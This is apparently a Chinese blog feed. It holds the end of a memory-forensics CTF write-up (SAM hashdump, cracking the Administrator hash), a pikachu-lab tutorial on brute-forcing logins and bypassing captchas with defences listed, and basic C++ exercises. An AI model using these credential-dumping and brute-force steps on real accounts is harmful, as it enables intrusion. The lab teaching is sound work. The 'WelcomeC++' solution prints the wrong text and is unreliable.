<p><img src="https://s2.loli.net/2023/09/29/h9SrAwkclRofWxb.png" alt="https://s2.loli.net/2023/09/29/h9SrAwkclRofWxb.png">  </p>
<p>查看cmd命令，得知存在文件flag.ccx </p>
<p><img src="https://s2.loli.net/2023/09/29/k6TmBaQqoZ1sFAP.png" alt="https://s2.loli.net/2023/09/29/k6TmBaQqoZ1sFAP.png">  </p>
<p>寻找flag.ccx文件，文件地址为0x3e435890</p>
<p><img src="https://s2.loli.net/2023/09/29/UVYw1xR4zDvMXF9.png" alt="https://s2.loli.net/2023/09/29/UVYw1xR4zDvMXF9.png">  </p>
<p>dump文件</p>
<p><img src="https://s2.loli.net/2023/09/29/2zay3veYw6dHTRq.png" alt="https://s2.loli.net/2023/09/29/2zay3veYw6dHTRq.png">  </p>
<p>寻找administrator的密码,列出SAM表的用户</p>
<p><img src="https://s2.loli.net/2023/09/29/fZeWzEJa6hiyDKO.png" alt="https://s2.loli.net/2023/09/29/fZeWzEJa6hiyDKO.png">  </p>
<p>获取SYSTEM SAM的虚拟地址,分别为0xfffff8a000024010  0xfffff8a001590010</p>
<p><img src="https://s2.loli.net/2023/09/29/dnEe5ZkHKsqxc8C.png" alt="https://s2.loli.net/2023/09/29/dnEe5ZkHKsqxc8C.png">  </p>
<p>hashdump获取用户密码的hash值</p>
<p><img src="https://s2.loli.net/2023/09/29/9T8dgItXK5NsLaH.png" alt="https://s2.loli.net/2023/09/29/9T8dgItXK5NsLaH.png">  </p>
<p>CMD5查询hash值得到Administrator账户的密码</p>
<p><img src="https://s2.loli.net/2023/09/29/VCKkj4bSzgXrJ3B.png" alt="https://s2.loli.net/2023/09/29/VCKkj4bSzgXrJ3B.png">  </p>
<p>CnCrypt加载得到flag,密码为ABCabc123  </p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>内存取证</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解</title>
    <url>/2023/09/30/Web%EF%BC%881%EF%BC%89%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>暴力破解漏洞是指黑客或攻击者利用计算机程序或脚本通过尝试所有可能的组合，来暴力破解系统、应用程序或网络的安全漏洞。这种攻击方法的目标通常是弱密码或不安全的加密算法。</p>
<p>暴力破解攻击的原理是，攻击者通过不断尝试可能的密码、密钥或其他安全参数，直到找到正确的组合为止。这种攻击方法虽然简单直接，但效率较低，因为它需要尝试大量可能性，特别是在密码复杂度较高或密钥空间较大的情况下。</p>
<ul>
<li><p>是否要求用户设置了复杂的密码</p>
</li>
<li><p>是否对每次认证都采用了安全的验证码</p>
</li>
<li><p>是否对尝试登陆的行为进行判断和限制</p>
</li>
<li><p>是否在必要的情况下采用了双因素验证</p>
<p>········</p>
</li>
</ul>
<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><ol>
<li>确认登陆接口的脆弱性</li>
<li>对字典进行优化</li>
<li>工具自动化操作</li>
</ol>
<h3 id="技巧一"><a href="#技巧一" class="headerlink" title="技巧一"></a>技巧一</h3><p>根据注册信息优化</p>
<p>如要求密码位数，字母数字组合</p>
<h3 id="技巧二"><a href="#技巧二" class="headerlink" title="技巧二"></a>技巧二</h3><p>爆破管理后台常用admin&#x2F;administrator&#x2F;root</p>
<p>如输入admin&#x2F;xxx，显示密码错误，则确定用户名为admin</p>
<h2 id="环境—-pikachu"><a href="#环境—-pikachu" class="headerlink" title="环境—-pikachu"></a>环境—-pikachu</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>基本就是利用直接手中的字典去进行撞库，以达到获取登陆密码的目的</p>
<h4 id="要点一"><a href="#要点一" class="headerlink" title="要点一"></a>要点一</h4><p>payload的设置，可考虑之前所说的基本技巧去缩小payload的范围，节省时间。</p>
<h4 id="要点二"><a href="#要点二" class="headerlink" title="要点二"></a>要点二</h4><p>注意以下四个在不同情况下的使用</p>
<ul>
<li><h5 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper"></a>Sniper</h5></li>
<li><h5 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering  ram"></a>Battering  ram</h5></li>
<li><h5 id="Pitchfork"><a href="#Pitchfork" class="headerlink" title="Pitchfork"></a>Pitchfork</h5></li>
<li><h5 id="Clusterbomb"><a href="#Clusterbomb" class="headerlink" title="Clusterbomb"></a>Clusterbomb</h5></li>
</ul>
<h4 id="要点三"><a href="#要点三" class="headerlink" title="要点三"></a>要点三</h4><p>检索匹配，得到不同的反应以确认正确的用户名与密码</p>
<p><img src="https://s2.loli.net/2023/09/30/9mK78p2husDXWdk.png" alt="1"></p>
<p>还可以根据返回包的数据长度去进行判断</p>
<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>例如验证码并没有设置过期期限，导致可以长期使用，使用同一个验证码反复登陆。</p>
<p><img src="https://s2.loli.net/2023/09/30/sZYHJXdL4hcxmCz.png" alt="4"></p>
<p><img src="https://s2.loli.net/2023/09/30/UgziedAs8jkn1tp.png" alt="5"></p>
<p><img src="https://s2.loli.net/2023/09/30/rPK9lSyAgRLcTwu.png" alt="6"></p>
<p><img src="https://s2.loli.net/2023/09/30/C13lMmbr8DYQdgz.png" alt="7"></p>
<h4 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h4><ol>
<li>验证码在后台不过期，导致可以长期使用</li>
<li>验证码校验不合格，逻辑出现问题</li>
<li>验证码设计的太过简单和有规律，容易被猜解</li>
</ol>
<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>由于将验证码写在前端，导致实际验证码并没有起到验证的效果，仍然可以撞库获取账户密码。</p>
<p>例如：在抓到的包中修改验证码为无，返回的包中并没有出现验证码错误的返回，而是出现正常的用户名和密码错误，说明验证码并没有起到防范的效果。</p>
<p><img src="https://s2.loli.net/2023/09/30/D7zmrOe52UKVATS.png" alt="2"></p>
<p><img src="https://s2.loli.net/2023/09/30/nXxyv8lteSZrM7G.png" alt="3"></p>
<h4 id="常见问题-1"><a href="#常见问题-1" class="headerlink" title="常见问题"></a>常见问题</h4><ul>
<li>使用前端js实现验证码</li>
<li>将验证码在cookie中泄露</li>
<li>将验证码在前端源代码中泄露，容易被获取</li>
</ul>
<h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><ul>
<li>设计安全的验证码</li>
<li>对认证错误的提交进行计数并给出限制，比如连续五次密码错误，锁定两小时</li>
<li>必要的情况下，使用双因素认证</li>
</ul>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>程序设计基础(1)-C++程序设计基础</title>
    <url>/2023/09/28/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80(1)-C++%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="程序设计基础-1-C-程序设计基础"><a href="#程序设计基础-1-C-程序设计基础" class="headerlink" title="程序设计基础(1)-C++程序设计基础"></a>程序设计基础(1)-C++程序设计基础</h1><h2 id="题目名称-A-HelloWorld"><a href="#题目名称-A-HelloWorld" class="headerlink" title="题目名称:A-HelloWorld"></a>题目名称:A-HelloWorld</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>每个学编程的人的第一个程序基本都是输出HelloWorld，这次试题就以输出HelloWorld开始吧。   </p>
<h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出结果    &quot;Hello  World!&quot;</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\&quot;Hello  World!\&quot;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-B-分而治之"><a href="#题目名称-B-分而治之" class="headerlink" title="题目名称:B-分而治之"></a>题目名称:B-分而治之</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>程序设计有一个重要的思想就是分而治之（Divide and conquer）。所谓“分而治之” 就是把一个复杂的问题按一定的方法分为解决方法相同但规模较小的若干部分，然后逐个解决，分别找出各部分的解，把各部分的解组成整个问题的解。C语言源程序一般包括多个函数，每个函数对应一个大任务分解后的子功能，其中main函数是程序开始执行的入口。main函数一般包括四部分逻辑功能：定义数据、输入数据、处理数据、输出数据。</p>
<h3 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Define data;</span><br><span class="line">2. Input data;</span><br><span class="line">3. Process data;</span><br><span class="line">4. Output data.</span><br></pre></td></tr></table></figure>

<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1. Define data;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2. Input data;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3. Process data;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4. Output data.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-C-实践出真知"><a href="#题目名称-C-实践出真知" class="headerlink" title="题目名称:C-实践出真知"></a>题目名称:C-实践出真知</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>于老师经常告诉我们“学习编程最好的办法就是上机实践，因为你要对计算机下指令，想让计算机帮你干活，就得多和计算机‘交流’，实践才能出真知。”</p>
<h3 id="输入描述-2"><a href="#输入描述-2" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="输出描述-2"><a href="#输出描述-2" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Practice makes perfect!</span><br></pre></td></tr></table></figure>

<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Practice makes perfect!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-D-打印出直角三角形"><a href="#题目名称-D-打印出直角三角形" class="headerlink" title="题目名称:D-打印出直角三角形"></a>题目名称:D-打印出直角三角形</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>rere想用计算机打印输出直角三角形，请帮他输出。</p>
<h3 id="输入描述-3"><a href="#输入描述-3" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-3"><a href="#输出描述-3" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br></pre></td></tr></table></figure>

<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-E-字符三角形"><a href="#题目名称-E-字符三角形" class="headerlink" title="题目名称:E-字符三角形"></a>题目名称:E-字符三角形</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>热热想输出由字符‘*’组成的金字塔，请编程帮他实现。</p>
<h3 id="输入描述-4"><a href="#输入描述-4" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-4"><a href="#输出描述-4" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  *</span><br><span class="line"> ***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>

<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">3</span>; <span class="comment">// 金字塔的高度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="comment">// 打印空格</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n - i; j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打印星号</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">2</span> * i - <span class="number">1</span>; k++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-F-我是大V"><a href="#题目名称-F-我是大V" class="headerlink" title="题目名称:F-我是大V"></a>题目名称:F-我是大V</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>每个人都想成为大V (VIP：Very Important Person)，但要一点一点积累才行，先从小v做起。要求输出由小写字母v组成的大V。</p>
<h3 id="输入描述-5"><a href="#输入描述-5" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-5"><a href="#输出描述-5" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v   v v v  v</span><br></pre></td></tr></table></figure>

<h3 id="备注"><a href="#备注" class="headerlink" title="备注:"></a>备注:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">换行使用转义字符‘\n’</span><br></pre></td></tr></table></figure>

<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;v   v\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; v v\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;  v\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-G-打印小队旗"><a href="#题目名称-G-打印小队旗" class="headerlink" title="题目名称:G-打印小队旗"></a>题目名称:G-打印小队旗</h2><h3 id="题目描"><a href="#题目描" class="headerlink" title="题目描"></a>题目描</h3><p>rere想用计算机打印输出小队旗，请帮他输出。</p>
<h3 id="输入描述-6"><a href="#输入描述-6" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-6"><a href="#输出描述-6" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">I*</span><br><span class="line">I**</span><br><span class="line">I***</span><br><span class="line">I****</span><br><span class="line">I*****</span><br><span class="line">I</span><br><span class="line">I</span><br><span class="line">I</span><br><span class="line">I</span><br></pre></td></tr></table></figure>

<h3 id="备注-1"><a href="#备注-1" class="headerlink" title="备注:"></a>备注:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I为大写字母&quot;i&quot;</span><br></pre></td></tr></table></figure>

<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;A&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;I&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;I&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-H-小飞机"><a href="#题目名称-H-小飞机" class="headerlink" title="题目名称:H-小飞机"></a>题目名称:H-小飞机</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>KiKi学会了printf在屏幕输出信息，他想输出一架小飞机。请帮他编写程序输出这架小飞机。</p>
<h3 id="输入描述-7"><a href="#输入描述-7" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-7"><a href="#输出描述-7" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     **     </span><br><span class="line">     **     </span><br><span class="line">************</span><br><span class="line">************</span><br><span class="line">    *  *    </span><br><span class="line">    *  *    </span><br></pre></td></tr></table></figure>

<h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;     **     &quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;     **     &quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;    *  *    &quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;    *  *    &quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-I-小孩踢球"><a href="#题目名称-I-小孩踢球" class="headerlink" title="题目名称:I-小孩踢球"></a>题目名称:I-小孩踢球</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>​	HuHu喜欢踢球，请帮他打印小孩踢球，详见“输出”。</p>
<h3 id="输入描述-8"><a href="#输入描述-8" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无11</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-8"><a href="#输出描述-8" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> O</span><br><span class="line">/H\</span><br><span class="line"> LL   o</span><br></pre></td></tr></table></figure>

<h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; O&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;/H\\&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; LL   o&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-J-小萨学名人名言"><a href="#题目名称-J-小萨学名人名言" class="headerlink" title="题目名称:J-小萨学名人名言"></a>题目名称:J-小萨学名人名言</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>  小萨爱发明，对于发明特别感兴趣，特别喜欢美国发明家爱迪生，所以找到一个爱迪生的名人名言想输出在屏幕上。爱迪生说过：A strong man will struggle with the storms of fate. </p>
<h3 id="输入描述-9"><a href="#输入描述-9" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-9"><a href="#输出描述-9" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Edison said: &quot;A strong man will struggle with the storms of fate.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 输入处理</span></span><br><span class="line">    <span class="comment">// 通常，这里会读取输入数据并执行相应的计算逻辑</span></span><br><span class="line">    <span class="comment">// 输出处理</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Edison said: \&quot;A strong man will struggle with the storms of fate.\&quot;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>程序设计基础习题</category>
      </categories>
      <tags>
        <tag>程序设计基础</tag>
      </tags>
  </entry>
  <entry>
    <title>程序设计基础(2)-数据表示及输入输出</title>
    <url>/2023/09/28/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80(2)-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA%E5%8F%8A%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</url>
    <content><![CDATA[<h1 id="程序设计基础-2-数据表示及输入输出"><a href="#程序设计基础-2-数据表示及输入输出" class="headerlink" title="程序设计基础(2)-数据表示及输入输出"></a>程序设计基础(2)-数据表示及输入输出</h1><h2 id="题目名称-A-WelcomeC"><a href="#题目名称-A-WelcomeC" class="headerlink" title="题目名称:A-WelcomeC++"></a>题目名称:A-WelcomeC++</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>孩子们开始学习C++了，计算机打印信息欢迎他们，详见输出描述。</p>
<h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无    </span><br></pre></td></tr></table></figure>

<h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello boys and girls!</span><br><span class="line">Welcome to C++ Program!</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\&quot;Hello  World!\&quot;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-B-有容乃大"><a href="#题目名称-B-有容乃大" class="headerlink" title="题目名称:B-有容乃大"></a>题目名称:B-有容乃大</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>确定不同整型数据类型在内存中占多大（字节），输出不同整型数据类型在内存中占多大（字节）。 </p>
<h3 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

